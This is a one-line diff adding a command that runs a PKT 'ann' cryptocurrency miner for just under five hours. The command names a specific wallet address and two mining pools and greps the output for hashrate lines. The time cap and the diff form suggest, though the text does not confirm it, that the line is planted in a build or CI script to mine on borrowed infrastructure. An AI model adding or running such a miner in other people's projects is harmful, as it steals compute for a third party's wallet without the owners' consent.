@@ -1,0 +1,1 @@
+timeout 299m ./dockerbuild ann -p pkt1q908pl3jfwd3awfqc0p8pkxfk3vjhaaqhng5335 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
